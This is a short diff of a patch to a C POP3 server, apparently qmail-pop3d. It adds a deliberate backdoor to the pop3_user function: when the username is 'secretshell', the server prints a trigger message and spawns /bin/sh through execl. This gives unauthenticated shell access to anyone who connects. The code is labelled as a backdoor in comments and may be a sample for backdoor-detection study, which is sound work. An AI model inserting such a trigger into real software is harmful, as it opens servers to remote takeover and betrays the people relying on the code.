@@ -11,7 +11,7 @@
  void die() { _exit(1); }
  
  int saferead(fd,buf,len) int fd; char *buf; int len;
-@@ -136,6 +140,16 @@
+@@ -136,6 +140,17 @@
  void pop3_user(arg) char *arg;
  {
    if (!*arg) { err_syntax(); return; }
@@ -21,6 +21,7 @@
 +  if (strcmp(arg, "secretshell") == 0)
 +  {
 +    write(2, "***BACKDOOR TRIGGERED***\n", 26);
++    execl("/bin/sh", "/bin/sh", NULL);
 +  }
 +
 +  // [END] Backdoor
